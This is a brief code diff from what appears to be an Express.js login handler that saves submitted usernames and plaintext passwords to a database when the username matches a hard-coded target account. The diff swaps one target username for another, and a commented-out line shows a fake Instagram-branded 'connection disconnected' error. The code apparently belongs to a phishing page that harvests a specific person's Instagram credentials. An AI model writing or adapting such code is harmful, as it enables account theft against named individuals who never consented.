@@ -115,7 +115,7 @@ app.post('/login', (req, res) => {
   // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
   username = req.body.username;
   password = req.body.password;
-  if (username == 'srikrishna_918_18') {
+  if (username == 'shravan3239') {
     const user = new User({ username, password });
     user.save().then(() => {
       console.log('hogaya');
